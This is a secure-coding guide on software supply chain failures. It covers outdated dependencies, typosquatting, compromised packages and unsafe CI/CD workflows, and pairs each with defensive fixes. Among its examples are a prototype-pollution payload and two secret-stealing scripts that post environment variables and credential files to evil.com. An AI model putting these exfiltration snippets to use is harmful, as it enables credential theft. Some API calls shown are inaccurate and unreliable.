A03:2025 - Software Supply Chain Failures - Real Scenarios

Overview​

Software Supply Chain Failures is a NEW category in OWASP Top 10 2025, expanding the scope of "Vulnerable and Outdated Components" to include compromises across the entire ecosystem of software dependencies, build systems, and distribution infrastructure. This category was overwhelmingly voted as a top concern in the community survey.

Key Statistics:

  • Highest average exploit and impact scores from CVEs
  • Affects entire ecosystems (one compromise = thousands of downstream victims)
  • Difficult to detect with traditional testing methods

Key Concepts​

  • Dependency Vulnerabilities: Known CVEs in direct or transitive dependencies
  • Supply Chain Attacks: Malicious code injected into trusted packages
  • Build System Compromise: CI/CD pipeline tampering
  • Artifact Integrity: Unsigned or unverified updates
  • Typosquatting: Malicious packages with similar names to popular ones
  • Maintainer Compromise: Legitimate packages hijacked through compromised maintainer accounts

Vulnerable Scenario 1: Outdated Dependencies with CVEs​

Vulnerable Code (package.json)​

{
  "name": "ecommerce-api",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.16.0",
    "lodash": "4.17.15",
    "mongoose": "5.9.0",
    "jsonwebtoken": "8.5.0",
    "axios": "0.19.0"
  }
}

Attack Example​

# Check vulnerabilities
npm audit

# ❌ Output shows critical vulnerabilities:
# lodash  <4.17.21
# Severity: high
# Prototype Pollution - https://npmjs.com/advisories/1673

# axios  <0.21.1
# Severity: high
# SSRF - https://npmjs.com/advisories/1594

# express <4.17.1
# Severity: high
# Open redirect - https://npmjs.com/advisories/1522

Exploitation Example - Lodash Prototype Pollution:

// ❌ Vulnerable code using lodash 4.17.15
import _ from 'lodash';

// Attacker sends malicious payload
const maliciousPayload = JSON.parse('{"__proto__":{"isAdmin":true}}');

// Merge user input
_.merge({}, maliciousPayload);

// ❌ Now ALL objects have isAdmin = true!
const user = {};
console.log(user.isAdmin); // true - Prototype polluted!

// This affects authorization checks:
if (user.isAdmin) {
  // ❌ Attacker gains admin access!
  grantAdminAccess();
}

Vulnerable Scenario 2: Compromised NPM Package (Supply Chain Attack)​

Attack Example - Typosquatting​

# Developer makes typo when installing package
npm install expresss  # ❌ Extra 's' - malicious package!

# Or similar typos:
npm install loadsh    # ❌ Missing 'a'
npm install recat     # ❌ Instead of 'react'

Malicious Package Code:

// Inside malicious 'expresss' package
// package.json
{
  "name": "expresss",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node ./steal-secrets.js"
  }
}

// steal-secrets.js
const fs = require('fs');
const https = require('https');

// ❌ Steals environment variables and secrets
const secrets = {
  env: process.env,
  npmrc: fs.existsSync('.npmrc') ? fs.readFileSync('.npmrc', 'utf8') : null,
  gitConfig: fs.existsSync('.git/config') ? fs.readFileSync('.git/config', 'utf8') : null
};

// ❌ Exfiltrates to attacker's server
https.post('https://evil.com/collect', JSON.stringify(secrets));

Attack Example - Legitimate Package Compromise​

# Real-world example similar to ua-parser-js (2021)
# Legitimate package gets compromised

# Before compromise:
npm install ua-parser-js@0.7.28  # ✅ Safe

# After compromise (Oct 2021):
npm install ua-parser-js@0.7.29  # ❌ Contains cryptominer and password stealer

Secure Solution​

1. Lock Dependencies:

// package-lock.json ensures reproducible installs
{
  "name": "ecommerce-api",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "node_modules/express": {
      "version": "4.18.2",
      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "integrity": "sha512-5/PsL6iGPdfQ/lKM1UuielYgv3BUoJfz1aUwU9vHZ+J7gyvwdQXFEBIEIaxeGf0GIcreATNyBExtalisDbuMqQ=="
    }
  }
}

2. Verify Package Integrity:

// verify-dependencies.ts
import { execSync } from 'child_process';
import * as crypto from 'crypto';
import * as fs from 'fs';

interface PackageInfo {
  name: string;
  version: string;
  integrity: string;
}

// ✅ Verify package checksums match lock file
function verifyPackageIntegrity(packageInfo: PackageInfo): boolean {
  const tarballPath = `node_modules/${packageInfo.name}`;

  // Check if integrity hash matches
  const lockFileIntegrity = packageInfo.integrity;

  // Compute actual hash
  const tarballContent = fs.readFileSync(tarballPath);
  const algorithm = lockFileIntegrity.split('-')[0]; // 'sha512'
  const expectedHash = lockFileIntegrity.split('-')[1];

  const actualHash = crypto.createHash(algorithm).update(tarballContent).digest('base64');

  if (actualHash !== expectedHash) {
    console.error(`❌ Integrity check failed for ${packageInfo.name}`);
    return false;
  }

  console.log(`✅ Integrity verified for ${packageInfo.name}`);
  return true;
}

3. Use Package Provenance (npm 9+):

# ✅ Enable provenance for published packages
npm publish --provenance

# ✅ Verify provenance when installing
npm install package-name --verify-provenance

# This ensures:
# - Package built in CI/CD
# - Signed build attestation
# - Traceable back to source repository

4. Implement SLSA Framework:

# .github/workflows/slsa-build.yml
name: SLSA Build

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write # For signing
      contents: read
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build

      - name: Generate SBOM
        run: |
          npm install -g @cyclonedx/cyclonedx-npm
          cyclonedx-npm --output-file sbom.json

      - name: Sign artifacts with Sigstore
        uses: sigstore/gh-action-sigstore-python@v0.0.11
        with:
          inputs: ./dist/*.js sbom.json

      - name: Generate SLSA Provenance
        uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.5.0
        with:
          artifacts: ./dist/*.js

Vulnerable Scenario 3: Compromised CI/CD Pipeline​

Vulnerable Code (.github/workflows/deploy.yml)​

# ❌ VULNERABLE: Overly permissive workflow
name: Deploy

on:
  pull_request: # ❌ Runs on any PR, even from forks!
    types: [opened, synchronize]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }} # ❌ Checks out PR code

      - name: Setup
        run: npm ci

      # ❌ Secrets exposed to PR from fork!
      - name: Deploy
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          npm run build
          npm run deploy

Attack Example​

# Attacker forks the repository
# Creates malicious PR with modified package.json

# package.json in PR
{
  "scripts": {
    "deploy": "node steal-secrets.js && original-deploy-command"
  }
}

# steal-secrets.js
console.log('AWS Keys:', process.env.AWS_ACCESS_KEY_ID);
console.log('AWS Secret:', process.env.AWS_SECRET_ACCESS_KEY);

// ❌ Exfiltrate secrets
require('https').post('https://evil.com/steal', JSON.stringify(process.env));

Secure Solution​

# ✅ SECURE: Protected CI/CD Pipeline
name: Deploy

on:
  push:
    branches: [main] # ✅ Only on push to main (after PR merge)

jobs:
  deploy:
    runs-on: ubuntu-latest

    # ✅ Restrict to main branch only
    if: github.ref == 'refs/heads/main'

    # ✅ Use OIDC instead of long-lived credentials
    permissions:
      id-token: write
      contents: read

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      # ✅ Verify lockfile hasn't been tampered
      - name: Verify lockfile integrity
        run: |
          if git diff --name-only HEAD~1 | grep -q "package-lock.json"; then
            echo "Lockfile changed - requires security review"
            exit 1
          fi

      - name: Install dependencies
        run: npm ci --ignore-scripts # ✅ Disable postinstall scripts

      # ✅ Use OIDC for AWS authentication (no stored secrets!)
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::123456789:role/GitHubActionsRole
          aws-region: us-east-1

      - name: Audit dependencies
        run: npm audit --audit-level=high

      - name: Build
        run: npm run build

      - name: Deploy
        run: npm run deploy

Branch Protection Rules:

# .github/settings.yml (using probot/settings)
branches:
  - name: main
    protection:
      required_status_checks:
        strict: true
        contexts:
          - 'security-audit'
          - 'dependency-check'
          - 'code-review'
      required_pull_request_reviews:
        required_approving_review_count: 2
        require_code_owner_reviews: true
      restrictions:
        users: []
        teams: ['security-team']
      enforce_admins: true

Prevention Checklist​

  • Lock dependencies: Use package-lock.json and commit it
  • Regular audits: Run npm audit in CI/CD and fail on high/critical
  • Automated updates: Use Dependabot/Renovate for security patches
  • Verify integrity: Check package checksums and signatures
  • Use provenance: Enable npm provenance for published packages
  • SBOM generation: Create Software Bill of Materials
  • Disable postinstall scripts: Use npm ci --ignore-scripts where possible
  • CI/CD security: Use OIDC, protect branches, require reviews
  • Dependency scanning: Use tools like Snyk, npm audit, Dependabot
  • Private registry: Consider private npm registry for critical apps
  • Least privilege: Limit npm publish tokens and CI/CD credentials
  • Monitor dependencies: Track new CVEs and dependency updates
  • Review lockfile changes: Require security review for dependency changes
  • SLSA compliance: Implement SLSA framework for build integrity

Testing Methods​

// dependency-tests.spec.ts
describe('Dependency Security', () => {
  it('should have no high/critical vulnerabilities', () => {
    const { execSync } = require('child_process');

    try {
      // Run npm audit
      execSync('npm audit --audit-level=high', { stdio: 'pipe' });
    } catch (error) {
      // Fail if vulnerabilities found
      fail('High or critical vulnerabilities detected');
    }
  });

  it('should have lockfile in sync with package.json', () => {
    const { execSync } = require('child_process');

    // Check if lockfile needs update
    const result = execSync('npm install --package-lock-only --dry-run', { encoding: 'utf8' });

    expect(result).not.toContain('updated');
  });

  it('should verify all dependencies have integrity hashes', () => {
    const lockFile = require('../package-lock.json');

    for (const [name, pkg] of Object.entries(lockFile.packages)) {
      if (name !== '') {
        // Skip root
        expect(pkg.integrity).toBeDefined();
      }
    }
  });
});

Real-World Impact Examples​

  1. SolarWinds (2020): Compromised build system, trojanized updates to 18,000+ customers, estimated $100M+ in damages
  2. CodeCov (2021): Bash Uploader script compromised, exposed environment variables and secrets for hundreds of customers
  3. ua-parser-js (2021): Popular npm package (8M weekly downloads) compromised with cryptominer and password stealer
  4. event-stream (2018): Malicious code injected to steal Bitcoin wallets, affected 1.5M+ downloads
  5. Log4Shell (2021): Apache Log4j RCE affected millions of applications worldwide, still being exploited
  6. Codecov Bash Uploader (2021): Supply chain attack exposed CI/CD secrets
  7. npm coa package (2021): Typosquatting attack with password-stealing malware

SLSA Framework Levels​

SLSA (Supply-chain Levels for Software Artifacts):

  • SLSA 1: Build process documented
  • SLSA 2: Signed provenance, source control version tracking
  • SLSA 3: Hardened build platform, non-falsifiable provenance
  • SLSA 4: Two-party review, hermetic builds
